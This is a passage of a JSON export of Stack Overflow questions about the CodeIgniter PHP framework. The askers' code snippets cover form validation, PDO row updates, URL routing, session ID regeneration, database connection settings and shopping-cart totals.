alt=\"Seats Selection\"></p>\n\n<p>I think the problem is with the looping of <code>foreach</code>. Am i doing it in the wrong way? Or is there any other method? Any help would be greatly appreciated. </p>\n\n<p>I'm using <code>datamapper</code>(db operations) for <code>codeigniter</code>(php framework).</p>\n"},{"tags":["codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":3992,"score":2,"question_id":2622745,"title":"codeigniter - loading a library from a view?","body":"<p>I have some data that I have to display as a table.</p>\n\n<p>I think I should pass the data from the controller as $data['events'] = array(.....</p>\n\n<p>and then load the view to display them.</p>\n\n<pre><code>        &lt;?php\n    $this-&gt;load-&gt;library('table');\n\n    echo $this-&gt;table-&gt;generate($events);\n    ?&gt;\n</code></pre>\n\n<p>this doesn't work though - it gives a Fatal error: Call to a member function generate() on a non-object</p>\n\n<p>If I paste the same code in the controller, obviously using ->generate($data['events'] the table gets displayed correctly.</p>\n\n<p>Should I get that views can't load libraries, or I am doing something wrong?\nOr maybe should I capture the output of the library in the controller and send that to the view?</p>\n"},{"tags":["php","oop","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":103,"score":2,"question_id":12795818,"title":"multiple form validation codeigniter conflict","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/5802729/codeigniter-2-forms-on-one-page-validation-errors-problem\">Codeigniter 2 forms on one page, validation_errors problem</a>  </p>\n</blockquote>\n\n\n\n<p>I have 2 forms in my page. I need to validate them 1 at a time but I think there is a conflict. Here take a look:</p>\n\n<p><img src=\"http://i.stack.imgur.com/XgzrF.png\" alt=\"enter image description here\"></p>\n\n<p>when I submit either of the form, both of them show the same error message</p>\n\n<p>I use <code>validation_errors()</code> to display the messages. How can I validate the form 1 at a time?</p>\n\n<p>Here is the code  </p>\n\n<pre><code>public function update_user_info(){ \n    $this-&gt;form_validation-&gt;set_rules(\"firstname\",\"First Name\",\"required\");     \n    $this-&gt;form_validation-&gt;set_rules(\"lastname\",\"Last Name\",\"required\"); \n    $this-&gt;form_validation-&gt;set_rules(\"middlename\",\"Middle Name\",\"required\"); \n    if($this-&gt;form_validation-&gt;run()===false){ \n        //wrong \n    } \n    else { //correct } \n}\n</code></pre>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12799195,"title":"using preg_replace function does not insert in mysql","body":"<p>I use preg_replace function, it works properly but when i insert into database (MYSQL) it is inserted unchanged (My   % \" \" name is   &amp; sourov, datta.) instead of \n\"My name is sourov, datta.\". What the reason that database don't insert properly?   </p>\n\n<pre><code>&lt;?php\n\n$des='My   %   name is   &amp; sourov, datta.';\n$des = preg_replace('/[^a-zA-Z0-9\\,\\.]/', ' ', $des);\necho $des; //output will : My name is sourov, datta.\n$data = array(\n           'title' =&gt; $des,\n        );\n\n$this-&gt;db-&gt;insert('mytable', $data); \n?&gt;\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12790076,"title":"CodeIgniter 'get' form action?","body":"<p>I've got a form on a page (view) which the URL for it is:</p>\n\n<blockquote>\n  <p>www.example.com/page?item=samsung-galaxy-nexus</p>\n</blockquote>\n\n<p>My form on this page (view) is:</p>\n\n<pre><code>&lt;form name=\"formsearch\" action=\"&lt;?php echo site_url(uri_string()); ?&gt;\" method=\"get\"&gt;\n&lt;input id= name=\"search\"name=\"search\" class=\"filter-search\" type=\"text\" placeholder=\"Search Me\"/&gt;\n&lt;button type=\"submit\" class=\"filter-button\"&gt;Search&lt;/button&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>So lets say I type in 'Microsoft' to my search and hit enter.  The URL + query strings I need it to go to would be:</p>\n\n<blockquote>\n  <p>www.example.com/page?item=samsung-galaxy-nexus&amp;search=microsoft</p>\n</blockquote>\n\n<p>I can get it working with normal PHP, however I can't seem to get it to work in CodeIgniter.  I've also gone into the config.php and set query url's to true.</p>\n\n<p>It should also be noted that if the current URL is:</p>\n\n<blockquote>\n  <p>www.example.com/page?item=samsung-galaxy-nexus</p>\n</blockquote>\n\n<p>If I do <code>&lt;?php echo current_url(); ?&gt;</code> it outputs </p>\n\n<blockquote>\n  <p>www.example.com/?page</p>\n</blockquote>\n\n<p>Notice how the ? has swapped places</p>\n"},{"tags":["php","mysql","codeigniter","pdo"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":158,"score":0,"question_id":11389312,"title":"Update Database row with only modified values via PDO through my own API","body":"<p>I am creating an API that interacts with an MVC setup (CodeIgniter) that connects to my database via PDO and I am wondering how to best achieve the scenario described below...</p>\n\n<p>Assume the following exists as a row in <code>Table1</code>: </p>\n\n<pre><code>| Id: 1 | Object: Box | Color: \"red\" | Length: 1 | Height: 2 | Width: 3 |\n</code></pre>\n\n<p>If I make the following API call (pseudo code):</p>\n\n<pre><code>$this-&gt;post( 'Table1/update', array('id'=&gt;1, 'color' =&gt; \"blue\") );\n</code></pre>\n\n<p>where it is assumed that the color parameter is updated to \"blue\", but all other params are to remain the same.</p>\n\n<p>*<em>What process do I go through to update only the color parameter and not the other empty params? [assume that there are many possible parameters, not just 4] *</em></p>\n\n<p>In my model, do I act like everything is to be updated and have every possible parameter listed with <code>bindParam</code> or do I dynamically (via <code>foreach</code> loop) iterate through all available parameters to create a PDO statement to update for only those values?  Stated more simply, <strong>how do I write the PDO statement to work with all possible combinations of row updating?</strong></p>\n\n<p>It seems to me that I have the following two options, but neither of them seems very efficient:</p>\n\n<p><strong>Use foreach loops to account for only present parameters:</strong></p>\n\n<pre><code>$sql = \"UPDATE `Table1` \n        SET \";\n$i = 0;\nforeach( $params as $key =&gt; $val )\n{\n    $sql .= '`' . $key . '` = :' . $key;\n    if( $i &lt; count( $params )-1 )\n    {\n        $sql .= ', ';\n    }\n    $i++;\n} \n\n$sql .= ' WHERE `Id` = :Id';\n\n$stmt = $this-&gt;db-&gt;prepare( $sql );\nforeach( $params as $key =&gt; $val )\n{\n    $stmt-&gt;bindParam( ':' . $key, $val, PDO::PARAM_STR );\n}\n$stmt-&gt;bindParam( ':Id', $params['id'], PDO::PARAM_INT );*/\n$stmt-&gt;execute();\n$stmt-&gt;closeCursor();\n</code></pre>\n\n<p><strong>Account for all parameters:</strong></p>\n\n<pre><code>$sql = \"UPDATE `Table1` \n        SET `Color` = :Color, `Length` = :Length, `Height` = :Height, `Width` = :Width \n        WHERE `Id` =:Id\";\n\n$stmt = $this-&gt;db-&gt;prepare( $sql ); \n$stmt-&gt;bindParam( ':Color', $params['color'], PDO::PARAM_STR );\n$stmt-&gt;bindParam( ':Length', $params['length'], PDO::PARAM_INT );\n$stmt-&gt;bindParam( ':Height', $params['height'], PDO::PARAM_INT );\n$stmt-&gt;bindParam( ':Width', $params['width'], PDO::PARAM_INT );\n$stmt-&gt;bindParam( ':Id', $params['id'], PDO::PARAM_INT );\n$stmt-&gt;execute();\n$stmt-&gt;closeCursor();\n</code></pre>\n\n<h3>Update:</h3>\n\n<p>The real crux of the problem is trying to create a single method in the model (called <code>update</code>) that the API can interact with and can take any number of parameters and correctly update that row with the given values, meanwhile keeping the other original values unchanged.</p>\n"},{"tags":["php","mysql","codeigniter","phpmyadmin","wamp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":95,"score":0,"question_id":12798257,"title":"Form validation error-Call to undefined method CI_Form_validation::set_fields() in php codeigniter","body":"<p>When i try to update the query in php- codeigniter I get this form_validation error. Here is my Controller\nTHIS gives me error and I am not able to update or add an entry into my database</p>\n\n<pre><code> &lt;?php\n\nclass Person extends CI_Controller {\n\n// num of records per page\nprivate $limit = 15;\nfunction Person() {\nparent::__construct();\n\n\n//$this-&gt;load-&gt;library('table','form_validation');\n$this-&gt;load-&gt;library('table');\n$this-&gt;load-&gt;library('form_validation');\n$this-&gt;form_validation-&gt;set_rules();\n$this-&gt;load-&gt;helper('url');\n\n$this-&gt;load-&gt;model('personModel', '', TRUE);\n}\n\nfunction index($offset = 0) {\n\n$uri_segment = 3;\n$offset = $this-&gt;uri-&gt;segment($uri_segment);\n\n// load data\n$persons = $this-&gt;personModel-&gt;get_paged_list($this-&gt;limit, $offset)-&gt;result();\n// have pagntn\n$this-&gt;load-&gt;library('pagination');\n$config['base_url'] = site_url('person/index/');\n$config['total_rows'] = $this-&gt;personModel-&gt;count_all();\n$config['per_page'] = $this-&gt;limit;\n$config['uri_segment'] = $uri_segment;\n$this-&gt;pagination-&gt;initialize($config);\n$data['pagination'] = $this-&gt;pagination-&gt;create_links();\n\n// generate table data\n$this-&gt;load-&gt;library('table');\n$this-&gt;table-&gt;set_empty(\"&amp;nbsp;\");\n$this-&gt;table-&gt;set_heading('No', 'Name', 'Gender', 'Education', \n'Date of Birth (dd-mm-   yyyy)', 'Interest', 'Actions');\n$i = 0 + $offset;\nforeach ($persons as $person) {\n$this-&gt;table-&gt;add_row(++$i, $person-&gt;name, strtoupper($person-&gt;gender) == \n'M' ? 'Male'  : 'Female', ($person-&gt;education),\ndate('d-m-Y',     strtotime($person-&gt;dob)), ($person-&gt;interest), \nanchor('person/view/' . $person-&gt;id, 'view', array('class' =&gt; 'view',\n'onclick' =&gt;   \"return confirm('View Full Details?')\")) . ' ' .\nanchor('person/update/' . $person-&gt;id, 'update', array('class' =&gt; 'update')) . ' ' .\nanchor('person/delete/' . $person-&gt;id, 'delete', array('class' =&gt; \n'delete', 'onclick' =&gt; \"return confirm('Are you sure want to delete this person?')\"))\n);\n}\n$data['table'] = $this-&gt;table-&gt;generate();\n$this-&gt;load-&gt;library('table');\n$this-&gt;load-&gt;library('form_validation');\n\n// load view\n$this-&gt;load-&gt;view('personList', $data);\n}\n\nfunction add() {\n\n// set validation propert/ies\n$this-&gt;set_fields();\n// set common properties\n$data['title'] = 'Add new person';\n$data['message'] = '';\n$data['action'] = site_url('person/addPerson');\n$data['link_back'] = anchor('person/index/', 'Back to list of persons',\narray('class' =&gt; 'back'));\n\n// load view\n$this-&gt;load-&gt;view('personEdit', $data);\n}\n\nfunction addPerson() {\n// set common properties\n$data['title'] = 'Add new person';\n$data['action'] = site_url('person/addPerson');\n$data['link_back'] = anchor('person/index/', 'Back to list of persons', \narray('class' =&gt; 'back'));\n\n// set validation properties\n$this-&gt;set_fields();\n$this-&gt;set_rules();\n\n// run validation\nif ($this-&gt;form_validation-&gt;run() == FALSE) {\n$data['message'] = '';\n} else {\n// save data\n$person = array('name' =&gt; $this-&gt;input-&gt;post('name'),\n'gender' =&gt; $this-&gt;input-&gt;post('gender'),\n'dob' =&gt; date('Y-m-d', strtotime($this-&gt;input-&gt;post('dob'))));\n$id = $this-&gt;personModel-&gt;save($person);\n// set form input name=\"id\"\n$this-&gt;form_validation-&gt;id = $id;\n\n// set user message\n$data['message'] = '&lt;div class=\"success\"&gt;add new person success&lt;/div&gt;';\n}\n\n// load view\n$this-&gt;load-&gt;view('personEdit', $data);\n}\n\n\n\nfunction view($id) {\n// set common properties\n$data['title'] = 'Person Details';\n$data['link_back'] = anchor('person/index/', 'Back to list of persons', \narray('class' =&gt; 'back'));\n\n// get person details\n$data['person'] = $this-&gt;personModel-&gt;get_by_id($id)-&gt;row();\n\n// load view\n$this-&gt;load-&gt;view('personView', $data);\n}\n\nfunction update($id) {\n// set validation properties\n$this-&gt;set_fields();\n\n// prefill form values\n$person = $this-&gt;personModel-&gt;get_by_id($id)-&gt;row();\n$this-&gt;form_validation-&gt;id = $id;\n$this-&gt;form_validation-&gt;name = $person-&gt;name;\n$_POST['gender'] = strtoupper($person-&gt;gender);\n$this-&gt;form_validation-&gt;dob = date('d-m-Y', strtotime($person-&gt;dob));\n\n// set common properties\n$data['title'] = 'Update person';\n$data['message'] = '';\n$data['action'] = site_url('person/updatePerson');\n$data['link_back'] = anchor('person/index/', 'Back to list of persons', \narray('class' =&gt; 'back'));\n\n// load view\n$this-&gt;load-&gt;view('personEdit', $data);\n}\n\nfunction updatePerson() {\n// set common properties\n$data['title'] = 'Update person';\n$data['action'] = site_url('person/updatePerson');\n$data['link_back'] = anchor('person/index/', 'Back to list of persons', \narray('class' =&gt; 'back'));\n\n// set validation properties\n$this-&gt;set_fields();\n$this-&gt;set_rules();\n\n// run validation\nif ($this-&gt;form_validation-&gt;run() == FALSE) {\n$data['message'] = '';\n} else {\n// save data\n$id = $this-&gt;input-&gt;post('id');\n$person = array('name' =&gt; $this-&gt;input-&gt;post('name'),\n'gender' =&gt; $this-&gt;input-&gt;post('gender'),\n'dob' =&gt; date('Y-m-d', strtotime($this-&gt;input-&gt;post('dob'))),\n'education'=&gt;$this-&gt;input-&gt;post('education'),\n'interest'=&gt;$this-&gt;input-&gt;post('interest'));\n$this-&gt;personModel-&gt;update($id, $person);\n// set user message\n$data['message'] = '&lt;div class=\"success\"&gt;update person success&lt;/div&gt;';\n}\n\n// load view\n$this-&gt;load-&gt;view('personEdit', $data);\n}\n\nfunction delete($id) {\n// delete person\n$this-&gt;personModel-&gt;delete($id);\n\n// redirect to person list page\nredirect('person/index/', 'refresh');\n}\n\n// validation fields\nfunction set_fields() {\n\n$fields['id'] = 'id';\n$fields['name'] = 'name';\n$fields['gender'] = 'gender';\n$fields['dob'] = 'dob';\n$fields['education']='educaiton';\n$fields['interest']='\n\n$this-&gt;form_validation-&gt;set_fields('$fields');\n//echo\"hellofff\";\n//exit;\n}\n\n// validation rules\nfunction set_rules() {\n$rules['name'] = 'trim|required';\n$rules['gender'] = 'trim|required';\n$rules['dob'] = 'trim|required|callback_valid_date';\n$rules['education']='trim|required';\n$rules['interest']='trim|required';\n$this-&gt;form_validation-&gt;set_rules($rules);\n$this-&gt;form_validation-&gt;set_message('required', '* required');\n$this-&gt;form_validation-&gt;set_message('isset', '* required');\n$this-&gt;form_validation-&gt;set_error_delimiters('&lt;p class=\"error\"&gt;', '&lt;/p&gt;');\n}\n\nfunction form_validation() {\n$this-&gt;add();\n}\n\n// date_validation callback\nfunction valid_date($str) {\nif (!ereg(\"^(0[1-9]|1[0-9]|2[0-9]|3[01])-(0[1-9]|1[012])-([0-9]{4})$\", $str)) {\n$this-&gt;form_validation-&gt;set_message('valid_date', 'date format is not \nvalid. dd-mm-yyyy');\nreturn false;\n} else {\nreturn true;\n}\n}\n\n}\n\n?&gt;\n\n\n\n\n\n\n\n This is my model:\n PersonMOdel: Database name is employeeregistration and tableused is tbl_person\n&lt;?php\nclass PersonModel extends CI_Model {\n// table name\nprivate $tbl_person= 'tbl_person';\n\nfunction Person(){\nparent::construct();\n}\n// get number of persons in database\nfunction count_all(){\n\nreturn $this-&gt;db-&gt;count_all($this-&gt;tbl_person);\n}\n// get persons with paging\nfunction get_paged_list($limit = 15, $offset = 0){\n\n$this-&gt;db-&gt;order_by('id','asc');\nreturn $this-&gt;db-&gt;get($this-&gt;tbl_person, $limit, $offset);\n}\n// get person by id\nfunction get_by_id($id){\n$this-&gt;db-&gt;where('id', $id);\nreturn $this-&gt;db-&gt;get($this-&gt;tbl_person);\n}\n// add new person\nfunction save($person){\n$this-&gt;db-&gt;insert($this-&gt;tbl_person, $person);\nreturn $this-&gt;db-&gt;insert_id();\n}\n// update person by id\nfunction update($id, $person){\n$this-&gt;db-&gt;where('id', $id);\n$this-&gt;db-&gt;update($this-&gt;tbl_person, $person);\n}\n// delete person by id\nfunction delete($id){\n$this-&gt;db-&gt;where('id', $id);\n$this-&gt;db-&gt;delete($this-&gt;tbl_person);\n}\n}\n?&gt;\n</code></pre>\n\n<p>This can be cossidered a CRUD application.</p>\n"},{"tags":["php","html","database","codeigniter","drop-down-menu"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":54,"score":-1,"question_id":12799445,"title":"assign selected option value from database","body":"<p>I have a form which contains a dropdown list of countries generated from database. When edit button is clicked all the form values get fetched from database. What i require is that when edit is clicked the selected option of the database must be that stored in the corresponding database. Here is my code i tried.</p>\n\n<pre><code>      $selected = $list[\"country_country_name\"];\n\n     &lt;tr&gt;&lt;td&gt;Country&lt;/td&gt;&lt;td&gt;&lt;select onchange=\"getCountry(this.value);\" name=\"country\" id=\"country\" &gt;&lt;?php  foreach( $query as $qry ) { print '&lt;option value=\"'.$qry[\"country_country_name\"].'\"'; if( $qry[\"country_country_name\"] == $selected ) print'selected'; print '&gt;'.$qry[\"country_country_name\"].'&lt;/option&gt;'.\"\\n\";} ?&gt;&lt;/select&gt;&lt;?php echo form_error('country'); ?&gt;&lt;/td&gt;&lt;/tr&gt;\n</code></pre>\n"},{"tags":["performance","codeigniter","profiling"],"answer_count":5,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":3628,"score":3,"question_id":2789089,"title":"Codeigniter: Profiling and Performance","body":"<p>I'm new to app development and CI as a whole, so I've got an oodle of questions.</p>\n\n<p>What is profiling?\nHow is it used?\nHow does it work?\nWhat is considered a \"long\" time?</p>\n\n<p>More importantly,</p>\n\n<p><strong>How do I use it to improve performance?</strong></p>\n\n<p><em>The reason I'm asking is b/c my app is <strong>really</strong> sluggish right now.</em></p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":68,"score":1,"question_id":12796936,"title":"convert mysql code to codeigniter","body":"<p>How can i convert this code into an acceptable codeigniter code:</p>\n\n<pre><code>mysql_select_db($database_connection_ched, $connection_ched);\n$query_Institutions = \"SELECT * FROM tb_institutional_profile ORDER BY tb_institutional_profile.institution_name ASC\";\n$Institutions = mysql_query($query_Institutions, $connection_ched) or die(mysql_error());\n$row_Institutions = mysql_fetch_assoc($Institutions);\n$totalRows_Institutions = mysql_num_rows($Institutions);\n\n&lt;td width=\"192\"&gt;&lt;select name=\"institution_id\"&gt;\n&lt;?php \ndo { \n&lt;option value=\"&lt;?php echo $row_Institutions['institution_id']?&gt;\" &gt;&lt;?php echo $row_Institutions['institution_name']?&gt;&lt;/option&gt;\n&lt;?php\n} while ($row_Institutions = mysql_fetch_assoc($Institutions));\n?&gt;\n&lt;/select&gt;&lt;/td&gt;\n</code></pre>\n"},{"tags":["php","database","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":112,"score":3,"question_id":12795300,"title":"Codeigniter: Unable to connect to your database server using the provided settings","body":"<p>I use codeigniter as cms framework, if database hostname is localhost, it works correctly.</p>\n\n<pre><code>$db['default']['hostname'] = 'localhost';\n$db['default']['username'] = 'root';\n$db['default']['password'] = 'test';\n$db['default']['database'] = 'jinma';\n$db['default']['dbdriver'] = 'mysql';\n$db['default']['dbprefix'] = '';\n$db['default']['pconnect'] = TRUE;\n</code></pre>\n\n<p>Using above configuration works correctly, but if hostname is changed to:</p>\n\n<pre><code>$db['default']['hostname'] = '192.168.1.222';\n</code></pre>\n\n<p>A Database Error Occurred:</p>\n\n<pre><code>Unable to connect to your database server using the provided settings.\nFilename: third_party/fuel/Loader.php\nLine Number: 134\n</code></pre>\n\n<p>and i can ssh 192.168.1.222,\nMeanwhile in 192.168.1.222, it's also ok when hostname is localhost.</p>\n\n<p>I searched in google and got a solution to add:</p>\n\n<pre><code>$db['default']['port'] = '3306';\n</code></pre>\n\n<p>but it doesn't work for me, any idea?</p>\n\n<p>Thank you, this is my first question, sorry to be stupid.</p>\n"},{"tags":["php","facebook","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12793643,"title":"sending data from model to controller in codeigniter 1.7.2","body":"<p>I am receiving <code>$fb_data[uid]</code> i.e Facebook UID from my model and I want to put this variable's value into my controller where the signup process is taking place\n passing fields in controller like this: </p>\n\n<pre><code>$sql_data = array('student_fname' =&gt; $student_fname, 'student_sname' =&gt; $student_sname, 'student_org' =&gt; $student_org, 'student_title' =&gt; $student_title, 'student_uid' =&gt; ?\n</code></pre>\n\n<p>I am confused how to insert the Facebook UID value here at my controller..</p>\n"},{"tags":["wordpress","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":218,"score":0,"question_id":9922341,"title":"wordpress or codeigniter","body":"<p>I know my question isn't about programming problem, I just need a suggestion to get started on right direction but I'm guessing this non-question post is going to be close :( there should be two types of post, \"ask question\" and \"ask suggestion\" :D</p>\n\n<p>I'm a beginner in PHP and currently getting my hands dirty on PHP OOP, made a little framework.</p>\n\n<p>I'm planning to learn codeigniter and wordpress, Kindly suggest me which thing should I start first with? \ncan I do full projects with wordpress like college/university CMS? Shopping cart? etc custom forms with dynamic fields/data? \nCan I use codeigniter scripts in wordpress custom page?</p>\n"},{"tags":[".htaccess","codeigniter","url-rewriting","routing","codeigniter-url"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":60,"score":4,"question_id":12793607,"title":"Routes in Codeigniter","body":"<p>I want to have a clean URL in CodeIgniter based application for User's Profile Information.</p>\n\n<p>Please Take a look at URL formats below.</p>\n\n<pre><code>Actual URL : http://www.mydomain.com/index.php/users/profile/user1\n</code></pre>\n\n<p>I'm expecting users to have Personal URL's like</p>\n\n<pre><code>http://www.mydomain.com/user1\nhttp://www.mydomain.com/user2\nhttp://www.mydomain.com/user3\n</code></pre>\n\n<p>URL <a href=\"http://www.mydomain.com/user1\" rel=\"nofollow\">http://www.mydomain.com/user1</a> should process <a href=\"http://www.mydomain.com/index.php/users/profile/user1\" rel=\"nofollow\">http://www.mydomain.com/index.php/users/profile/user1</a> in background execution.</p>\n\n<p>I will be removing index.php from URL using Route library. </p>\n\n<p>Thanks in advance for any sort of help.</p>\n"},{"tags":["php","mvc","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":414,"score":1,"question_id":6432967,"title":"Call one function from another using codeigniter","body":"<p>I'm using CodeIgniter and I came across an interesting problem. I need to use the variables from one function on another. I was planning to do this by simply declaring global variables (which I wasn't able to) do in the framework. So I tried calling one function from within another (this is all happening in the controller). Since apparently this can't be done I made a helper file with the common function and then just tried to load it but I get this error:</p>\n\n<pre><code>Fatal error: Call to undefined method ReporteNominas::getValues()\n</code></pre>\n\n<p>the helper file is inside the helpers folder and it contains this:</p>\n\n<pre><code>function getValues($getThem, $tpar, $vpiso, $tcomi, $tgas, $ttotal){\n            $totalPares = $tpar;\n            $ventasPiso = $vpiso;\n            $totalComisiones = $tcomi;\n            $totalGastos = $tgas;\n            $totalTotal = $ttotal;\n            if($getThem){\n                return $totalPares . \",\" . $ventasPiso . \",\" . $totalComisiones . \",\" . $totalGastos . \",\" . $totalTotal;\n            }\n        }\n</code></pre>\n\n<p>and I'm trying to call it doing this:</p>\n\n<pre><code>$this-&gt;load-&gt;helper('helper_common_functions_helper');\n                $this-&gt;getValues(false, $query['cant'], $query['sum'], $query['com'], $query['gas'], $query['tot']);\n</code></pre>\n\n<p>what could I be missing here?</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12776737,"title":"Total amount is ok when i enter one record in both tables if i insert 2nd record in 2nd talble than total amount will double","body":"<p>Dear all friends i am new in Codeigniter framework i want total amount by selecting two table data, the problem is that when i enter data in 2nd table than total will double.  </p>\n\n<pre><code>function total_amount($booking_no = NULL)\n{\n    $data  = array('forwarding_cargo_booking_details.*',\n                   'other_charges.client_amount');\n\n\n    $this-&gt;db-&gt;select($data);\n    $this-&gt;db-&gt;where('forwarding_cargo_booking_details.booking_no',$booking_no);\n    $this-&gt;db-&gt;join('other_charges','forwarding_cargo_booking_details.booking_no = other_charges.booking_no','left');\n    $this-&gt;db-&gt;select('sum((`bk_m3`*`o_freight_client`)*(`selling_rate`)+`pod_client`+`thc_client`+`caf_client`+`baf_client`+`haulage_client`+`war_risk_client`+`warehouse_client`+`thc_dest_client`+`pp_surcharge_client`+`doc_charges_client`+`client_amount`) as salam', FAlSE);\n    $query = $this-&gt;db-&gt;get('forwarding_cargo_booking_details');            \n    if($query-&gt;num_rows() &gt; 0)\n    {\n        return $query-&gt;row();\n    }\n}\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3655,"score":1,"question_id":8079760,"title":"Code igniter PDF library?","body":"<p>Suggest me the suitable PDF library for codeigniter?</p>\n\n<p><a href=\"http://codeigniter.com/news/codeigniter_community_voice_generating_pdf_files_using_codeigniter/\" rel=\"nofollow\">http://codeigniter.com/news/codeigniter_community_voice_generating_pdf_files_using_codeigniter/</a> </p>\n\n<p>just before i have tested this but this one doesn't have the html to pdf output like in dompdf. </p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":53,"score":4,"question_id":12789347,"title":"Why is the sess_update called at all in CodeIgniter?","body":"<p>Why does the session Id need to be updated at all in CodeIgniter. I know you can control how often the session id is updated in the config. But why do they change the id of the session every 5 min (by default)? </p>\n\n<p>Why can't an session be created once and it use the same id till the session expires?</p>\n\n<p>The function that updates the session is here:</p>\n\n<pre><code>/**\n * Update an existing session\n *\n * @access  public\n * @return  void\n */\nfunction sess_update()\n{\n    // We only update the session every five minutes by default\n    if (($this-&gt;userdata['last_activity'] + $this-&gt;sess_time_to_update) &gt;= $this-&gt;now)\n    {\n        return;\n    }\n\n    // Save the old session id so we know which record to\n    // update in the database if we need it\n    $old_sessid = $this-&gt;userdata['session_id'];\n    $new_sessid = '';\n    while (strlen($new_sessid) &lt; 32)\n    {\n        $new_sessid .= mt_rand(0, mt_getrandmax());\n    }\n\n    // To make the session ID even more secure we'll combine it with the user's IP\n    $new_sessid .= $this-&gt;CI-&gt;input-&gt;ip_address();\n\n    // Turn it into a hash\n    $new_sessid = md5(uniqid($new_sessid, TRUE));\n\n    // Update the session data in the session data array\n    $this-&gt;userdata['session_id'] = $new_sessid;\n    $this-&gt;userdata['last_activity'] = $this-&gt;now;\n\n    // _set_cookie() will handle this for us if we aren't using database sessions\n    // by pushing all userdata to the cookie.\n    $cookie_data = NULL;\n\n    // Update the session ID and last_activity field in the DB if needed\n    if ($this-&gt;sess_use_database === TRUE)\n    {\n        // set cookie explicitly to only have our session data\n        $cookie_data = array();\n        foreach (array('session_id','ip_address','user_agent','last_activity') as $val)\n        {\n            $cookie_data[$val] = $this-&gt;userdata[$val];\n        }\n\n        $this-&gt;CI-&gt;db-&gt;query($this-&gt;CI-&gt;db-&gt;update_string($this-&gt;sess_table_name, array('last_activity' =&gt; $this-&gt;now, 'session_id' =&gt; $new_sessid), array('session_id' =&gt; $old_sessid)));\n    }\n\n    // Write the cookie\n    $this-&gt;_set_cookie($cookie_data);\n}\n</code></pre>\n"},{"tags":["php","codeigniter","helpers","pyrocms"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":3721,"score":5,"question_id":4281073,"title":"PyroCMS helper documentation","body":"<p>I'm working on a PyroCMS project, but having problems due to the lack of complete documentation. Does anyone know where I can find a list of core helpers, such as <code>{pyro:navigation:links}</code>?</p>\n"},{"tags":["php","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":37,"score":-3,"question_id":12777363,"title":"is there anyone who have used mobilpay payment gateway in","body":"<p>Is there anyone who have used mobilpay payment gateway. I am having the error:</p>\n\n<pre><code>Error while loading X509 public key certificate! \nReason:error:0200107B:system    \nlibrary:fopen:Unknown error error:2006D002:BIO \nroutines:BIO_new_file:system lib error:0200107B:system \nlibrary:fopen:Unknown error error:2006D002:BIO \nroutines:BIO_new_file:system lib\n</code></pre>\n"},{"tags":["php","codeigniter","address","lookup","postcode"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":444,"score":-2,"question_id":7965939,"title":"Finding full address from postcode, what is the solution?","body":"<p>Basically I am making an application form for my site. I need to search for a full address using the user input postcode and would like to offer the results of that postcode for them to choose. I am aware that a database of sorts will be required but I am struggling to source this and would appreciate any help.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12786170,"title":"How to add the values of multi-deminsional array?","body":"<p>I'm using CODEIGNITER Cart Class. The following is a <code>VAR_DUMP</code> of the cart contents. I have a radio selection field which allows you to select a <code>SHIP</code> option. The problem is that my PHP is not getting the <code>SHIP</code> values but only returning the last item in cart's value and multiplying by the total number of cart items. How do I get the <code>SHIP</code> array from each item and sum the values?</p>\n\n<h1>PHP</h1>\n\n<pre><code>$ship_array = $this-&gt;cart-&gt;ship($item['rowid']); \nforeach ($ship_array as $index =&gt; $ship_option){\n        #SHIPPING CALC\n\n        $ship_total = 0;\n\n        foreach ($cart as $item)\n        {\n         $ship_total += $ship_option;\n        }\n\necho '&lt;label&gt;&lt;input type=\"radio\" name=\"print\" class=\"option\" data-number=\"'. $ship_total .'\" value=\"'. $index .'\"/&gt; UPS '. $index .' &lt;/label&gt; '; }\n</code></pre>\n\n<p>^this code will only get the values from <code>ship</code> in the last item in the cart. The result will say that <code>ground</code> shipping is $43.35 (14.45 (ground shipping value * 3 total items) </p>\n\n<p>Obviously this is wrong i need to add the shipping values from each <code>$item</code></p>\n\n<h1>VAR_DUMP of Arrays (all items in cart)</h1>\n\n<pre><code>array (size=3)\n  '554ed09a5f80917741359cc9da50a75c' =&gt; \n    array (size=8)\n      'rowid' =&gt; string '554ed09a5f80917741359cc9da50a75c' (length=32)\n      'id' =&gt; string '101' (length=3)\n      'qty' =&gt; string '1' (length=1)\n      'price' =&gt; string 